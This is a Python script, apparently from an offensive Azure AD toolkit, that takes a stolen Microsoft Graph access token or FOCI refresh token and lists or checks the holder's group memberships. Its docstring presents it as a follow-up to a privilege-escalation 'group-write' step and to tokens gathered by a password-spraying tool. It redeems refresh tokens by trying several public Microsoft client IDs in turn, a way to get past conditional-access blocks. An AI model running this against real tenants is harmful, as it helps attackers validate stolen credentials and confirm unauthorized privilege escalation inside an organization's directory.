#!/usr/bin/env python3
"""
check_group_membership.py - given a Microsoft Graph access token, report the
user's group memberships, or check membership of one specific group.

Useful after a group-write step (see roadrecon_privesc.py) to confirm you
actually landed in a target group, or to enumerate what a validated credential's
token already belongs to.

Accepts either a DELEGATED Graph access token (audience graph.microsoft.com) or
a FOCI refresh token, which it redeems for a Graph token via a public client
(no secret), trying the FOCI family in turn until one works. Both can come from
apimspray's tokens.jsonl.

Examples:
    # list all (transitive) groups for an access token's user
    python3 check_group_membership.py --token "$AT"

    # redeem a FOCI refresh token, then check one group
    python3 check_group_membership.py --refresh-token "$RT" --group "JAFRA_MDM_Corp Users"
    python3 check_group_membership.py --refresh-token-file rt.txt --tenant contoso.com

    # check one group by objectId or by display name
    python3 check_group_membership.py --token-file at.txt --group "JAFRA_MDM_Corp Users"
    python3 check_group_membership.py --token - --group 11111111-2222-3333-4444-555555555555

    # check a different user (needs a token with directory read rights)
    python3 check_group_membership.py --token "$AT" --user alice@corp.com --group "Slack Access"
"""

import argparse
import json
import re
import sys
import urllib.parse

import requests

GRAPH = "https://graph.microsoft.com/v1.0"
GUID_RE = re.compile(r"^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$")

# Public FOCI clients to redeem a refresh token as (no secret needed). A FOCI
# refresh token is interchangeable across the family, but a given RT may be
# bound to one member or a client may be CA-blocked, so we try them in order.
DEFAULT_FOCI_CLIENT = "04b07795-8ddb-461a-bbee-02f9e1bf7b46"
FOCI_CLIENTS = [
    ("04b07795-8ddb-461a-bbee-02f9e1bf7b46", "Microsoft Azure CLI"),
    ("1950a258-227b-4e31-a9cf-717495945fc2", "Microsoft Azure PowerShell"),
    ("14d82eec-204b-4c2f-b7e8-296a70dab67e", "Microsoft Graph PowerShell"),
    ("1b730954-1685-4b74-9bfd-dac224a7b894", "Azure Active Directory PowerShell"),
    ("d1ddf0e4-d672-4dae-b554-9d5bdfd93547", "Microsoft Intune PowerShell"),
    ("1fec8e78-bce4-4aaf-ab1b-5451cc387264", "Microsoft Teams"),
    ("d3590ed6-52b3-4102-aeff-aad2292ab01c", "Microsoft Office"),
]


def _read_source(value, is_file, label):
    """Resolve a token from a literal, '-' (stdin), or a file path."""
    if value == "-":
        raw = sys.stdin.read().strip()
    elif is_file:
        with open(is_file, "r", encoding="utf-8") as f:
            raw = f.read().strip()
    else:
        raw = (value or "").strip()
    if not raw:
        return None
    if raw.lower().startswith("bearer "):
        raw = raw[7:].strip()
    # tolerate a tokens.jsonl line: pull the right field for this source
    if raw.startswith("{"):
        try:
            obj = json.loads(raw)
            raw = obj.get("refresh_token" if label == "refresh" else "access_token", raw)
        except ValueError:
            pass
    return raw


def _try_redeem(rt, client_id, tenant):
    """One redemption attempt. Returns (access_token, None) or (None, error)."""
    url = f"https://login.microsoftonline.com/{tenant}/oauth2/v2.0/token"
    data = {
        "grant_type": "refresh_token",
        "client_id": client_id,
        "refresh_token": rt,
        "scope": "https://graph.microsoft.com/.default offline_access",
    }
    try:
        r = requests.post(url, data=data, timeout=30)
    except requests.RequestException as e:
        return None, f"request error: {e}"
    if r.status_code == 200:
        at = r.json().get("access_token")
        return (at, None) if at else (None, "no access_token in response")
    try:
        err = r.json()
        return None, f"{err.get('error')}: {err.get('error_description', '')[:200]}"
    except ValueError:
        return None, f"HTTP {r.status_code}: {r.text[:200]}"


def redeem_refresh_token(rt, client_id, tenant, fallback=True):
    """Exchange a (FOCI) refresh token for a Graph access token via a public
    client. Tries the chosen client first, then the rest of the FOCI family
    until one succeeds."""
    names = dict(FOCI_CLIENTS)
    order = [client_id] + [c for c, _ in FOCI_CLIENTS if c != client_id] if fallback else [client_id]
    last = None
    for cid in order:
        at, err = _try_redeem(rt, cid, tenant)
        if at:
            label = names.get(cid, cid)
            print(f"[*] redeemed refresh token via {label} ({cid}), tenant {tenant}.", file=sys.stderr)
            return at
        last = err
        print(f"[-] {names.get(cid, cid)} ({cid}) failed: {err}", file=sys.stderr)
    sys.exit(f"[!] refresh-token redemption failed against all {len(order)} client(s). Last: {last}")


def read_token(args):
    if args.refresh_token or args.refresh_token_file:
        rt = _read_source(args.refresh_token, args.refresh_token_file, "refresh")
        if not rt:
            sys.exit("[!] no refresh token provided.")
        return redeem_refresh_token(rt, args.client_id, args.tenant, fallback=not args.no_fallback)
    tok = _read_source(args.token, args.token_file, "access")
    if not tok:
        sys.exit("[!] no token provided (use --token / --token-file / --token -, or --refresh-token).")
    return tok


def graph_get(session, url):
    r = session.get(url, timeout=30)
    if r.status_code == 401:
        sys.exit("[!] 401 Unauthorized - token expired, wrong audience (needs graph.microsoft.com), or revoked.")
    if r.status_code == 403:
        sys.exit(f"[!] 403 Forbidden - token lacks the directory read scope for this call.\n    {r.text[:300]}")
    r.raise_for_status()
    return r.json()


def graph_pages(session, url):
    out = []
    while url:
        data = graph_get(session, url)
        out.extend(data.get("value", []))
        url = data.get("@odata.nextLink")
    return out


def whoami(session, user):
    """Return (id, label) for the subject. 'me' uses /me (delegated only)."""
    if user:
        ident = urllib.parse.quote(user, safe="")
        u = graph_get(session, f"{GRAPH}/users/{ident}?$select=id,userPrincipalName,displayName")
        return u["id"], u.get("userPrincipalName") or u.get("displayName") or user
    u = graph_get(session, f"{GRAPH}/me?$select=id,userPrincipalName,displayName")
    return u["id"], u.get("userPrincipalName") or u.get("displayName") or "me"


def resolve_group(session, group):
    """Return (id, displayName) for a group given its id or display name."""
    if GUID_RE.match(group):
        g = graph_get(session, f"{GRAPH}/groups/{group}?$select=id,displayName")
        return g["id"], g.get("displayName")
    filt = urllib.parse.quote(f"displayName eq '{group.replace(chr(39), chr(39)*2)}'", safe="")
    hits = graph_get(session, f"{GRAPH}/groups?$filter={filt}&$select=id,displayName").get("value", [])
    if not hits:
        sys.exit(f"[!] no group found with displayName == {group!r}")
    if len(hits) > 1:
        print(f"[!] {len(hits)} groups share that name; checking all:", file=sys.stderr)
    return [(h["id"], h.get("displayName")) for h in hits]


def main():
    ap = argparse.ArgumentParser(description="Check group membership for a Graph access token.")
    ap.add_argument("--token", help="Graph access token string, or '-' to read from stdin.")
    ap.add_argument("--token-file", help="File containing the access token (or a tokens.jsonl line).")
    ap.add_argument("--refresh-token", help="Refresh token to redeem for a Graph token (FOCI), or '-' for stdin. Overrides --token.")
    ap.add_argument("--refresh-token-file", help="File with a refresh token (or a tokens.jsonl line).")
    ap.add_argument("--client-id", default=DEFAULT_FOCI_CLIENT,
                    help="FOCI public client to try FIRST when redeeming (default: Microsoft Azure CLI).")
    ap.add_argument("--tenant", default="organizations",
                    help="Tenant for refresh-token redemption (default: organizations; or a tenant id/domain).")
    ap.add_argument("--no-fallback", action="store_true",
                    help="Only try --client-id; do not fall back through the rest of the FOCI family.")
    ap.add_argument("--group", help="Group to check: objectId or exact displayName. Omit to list all memberships.")
    ap.add_argument("--user", help="Check this user (UPN or id) instead of the token's own user. Needs directory read.")
    ap.add_argument("--transitive", action="store_true", default=True, help="Use transitive membership (default).")
    ap.add_argument("--direct-only", action="store_true", help="Only direct membership, not nested.")
    args = ap.parse_args()

    token = read_token(args)
    session = requests.Session()
    session.headers.update({"Authorization": f"Bearer {token}", "Accept": "application/json"})

    subj_id, subj_label = whoami(session, args.user)
    rel = "memberOf" if args.direct_only else "transitiveMemberOf"
    base = f"{GRAPH}/users/{subj_id}" if args.user else f"{GRAPH}/me"

    if not args.group:
        groups = graph_pages(session, f"{base}/{rel}/microsoft.graph.group?$select=id,displayName,isAssignableToRole")
        print(f"[*] {subj_label} is a member of {len(groups)} group(s) ({'direct' if args.direct_only else 'transitive'}):")
        for g in sorted(groups, key=lambda x: (x.get("displayName") or "").lower()):
            ra = "  [role-assignable]" if g.get("isAssignableToRole") else ""
            print(f"    - {g.get('displayName')}  ({g['id']}){ra}")
        return

    targets = resolve_group(session, args.group)
    if isinstance(targets, tuple):
        targets = [targets]

    # Pull the subject's group ids once, then test membership locally.
    member_ids = {g["id"] for g in graph_pages(session, f"{base}/{rel}/microsoft.graph.group?$select=id")}
    for gid, gname in targets:
        status = "MEMBER" if gid in member_ids else "not a member"
        mark = "[+]" if gid in member_ids else "[-]"
        print(f"{mark} {subj_label} -> {gname} ({gid}): {status}")


if __name__ == "__main__":
    main()
